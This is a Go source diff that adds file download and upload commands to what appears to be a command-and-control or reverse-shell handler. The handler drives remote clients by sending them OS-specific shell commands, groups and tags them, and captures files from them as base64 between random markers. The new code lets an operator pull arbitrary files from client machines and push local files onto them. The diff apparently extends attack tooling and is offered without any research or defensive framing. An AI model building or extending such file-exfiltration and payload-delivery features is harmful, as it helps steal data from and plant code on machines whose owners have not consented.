@@ -1,7 +1,10 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
+	"os"
+	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -29,6 +32,8 @@ var commands = map[string]CmdHandler{
 	"group":    cmdGroup,
 	"gr":       cmdGroupRun,
 	"grun":     cmdGroupRunAlias,
+	"download": cmdDownload,
+	"upload":   cmdUpload,
 }
 
 // Dispatch parses a line and routes it to the appropriate handler.
@@ -355,7 +360,6 @@ func cmdAll(s *Server, args []string) bool {
 
 func cmdGroup(s *Server, args []string) bool {
 	if len(args) == 1 {
-		// List all groups
 		s.mu.RLock()
 		if len(s.groups) == 0 {
 			s.mu.RUnlock()
@@ -426,13 +430,11 @@ func cmdGroup(s *Server, args []string) bool {
 			return true
 		}
 		if len(args) == 3 {
-			// Delete entire group
 			delete(s.groups, name)
 			s.mu.Unlock()
 			fmt.Printf("[*] group '%s' deleted\n", name)
 			return true
 		}
-		// Remove one member
 		cid, err := strconv.Atoi(args[3])
 		if err != nil {
 			s.mu.Unlock()
@@ -581,6 +583,110 @@ func cmdGroupRunAlias(s *Server, args []string) bool {
 	return true
 }
 
+func cmdDownload(s *Server, args []string) bool {
+	if len(args) < 3 {
+		fmt.Println("[!] usage: download <id|tag> <remote_path>")
+		return true
+	}
+	client := resolveClient(s, args[1])
+	if client == nil {
+		fmt.Printf("[!] no client %q\n", args[1])
+		return true
+	}
+	cid := client.ID
+	remotePath := strings.Join(args[2:], " ")
+
+	if client.OS == "" {
+		fmt.Printf("[!] client %d has no OS flag; use 'os %d windows|linux'\n", cid, cid)
+		return true
+	}
+	if client.Capture != nil && !client.Capture.IsDone() {
+		fmt.Printf("[!] client %d already has a download in progress\n", cid)
+		return true
+	}
+
+	marker := randomHex(6)
+	startMarker := "===DLSTART_" + marker + "==="
+	endMarker := "===DLEND_" + marker + "==="
+
+	localFile := filepath.Base(strings.ReplaceAll(remotePath, "\\", "/"))
+
+	capture := &CaptureState{
+		startMarker: startMarker,
+		endMarker:   endMarker,
+		localPath:   localFile,
+		done:        make(chan struct{}),
+	}
+
+	s.mu.Lock()
+	if c, ok := s.clients[cid]; ok {
+		c.Capture = capture
+	}
+	s.mu.Unlock()
+
+	cmd := buildDownloadCommand(client.OS, remotePath, startMarker, endMarker)
+	if err := s.SendTo(cid, cmd); err != nil {
+		fmt.Printf("[!] %v\n", err)
+		s.mu.Lock()
+		if c, ok := s.clients[cid]; ok {
+			c.Capture = nil
+		}
+		s.mu.Unlock()
+		return true
+	}
+
+	fmt.Printf("[*] download started: sent base64 command to client %d\n", cid)
+	fmt.Printf("[*] file will be saved as: %s\n", localFile)
+	return true
+}
+
+func cmdUpload(s *Server, args []string) bool {
+	if len(args) < 4 {
+		fmt.Println("[!] usage: upload <id|tag> <local_path> <remote_path>")
+		return true
+	}
+	client := resolveClient(s, args[1])
+	if client == nil {
+		fmt.Printf("[!] no client %q\n", args[1])
+		return true
+	}
+	cid := client.ID
+	localPath := args[2]
+	remotePath := strings.Join(args[3:], " ")
+
+	if client.OS == "" {
+		fmt.Printf("[!] client %d has no OS flag; use 'os %d windows|linux'\n", cid, cid)
+		return true
+	}
+
+	data, err := os.ReadFile(localPath)
+	if err != nil {
+		fmt.Printf("[!] cannot read local file: %v\n", err)
+		return true
+	}
+
+	if len(data) > uploadMaxSize {
+		fmt.Printf("[!] file too large (%d bytes, max %d bytes)\n", len(data), uploadMaxSize)
+		return true
+	}
+	if len(data) > uploadWarnSize {
+		fmt.Printf("[*] warning: large file (%d bytes), transfer may be slow\n", len(data))
+	}
+
+	b64 := base64.StdEncoding.EncodeToString(data)
+	cmds := buildUploadCommands(client.OS, remotePath, b64)
+
+	fmt.Printf("[*] uploading %s (%d bytes, %d chunk(s)) to client %d\n", localPath, len(data), len(cmds), cid)
+	for _, cmd := range cmds {
+		if err := s.SendTo(cid, cmd); err != nil {
+			fmt.Printf("[!] send failed: %v\n", err)
+			return true
+		}
+	}
+	fmt.Printf("[*] upload complete: sent to client %d -> %s\n", cid, remotePath)
+	return true
+}
+
 const helpText = `  list / ls                         show connected clients
   <id|tag> <message>                send message to client
   all <message>                     broadcast to all clients
@@ -591,6 +697,8 @@ const helpText = `  list / ls                         show connected clients
   tag                               list tagged clients
   tag <id|tag> <name>               set client tag
   tag <id|tag>                      clear client tag
+  download <id|tag> <remote_path>   download file from client (base64 capture)
+  upload <id|tag> <local> <remote>  upload local file to client
   alias                             list aliases
   alias add <name> <win> ::: <lin>  define alias
   alias del <name>                  remove alias
